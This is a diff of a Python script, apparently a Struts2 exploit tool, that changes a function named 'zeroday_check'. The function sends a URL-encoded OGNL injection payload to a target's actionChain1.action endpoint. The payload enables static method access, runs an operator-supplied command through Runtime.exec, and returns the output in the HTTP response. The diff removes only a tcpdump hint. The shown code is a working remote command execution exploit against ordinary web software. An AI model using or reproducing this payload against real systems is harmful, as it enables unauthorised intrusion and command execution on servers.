@@ -9,7 +9,6 @@ import time
 def zeroday_check(tgtURL, tgtPATH, tgtCMD):
 	urlcheck = tgtURL+""+tgtPATH
 	print "[+] Checking Vulnerability: "+urlcheck
-	print "Run tcpdump on for ICMP on your IP "
 	command = tgtCMD
 	payload = "%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec("+command+").getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action"
 	resp = requests.get(urlcheck+payload)
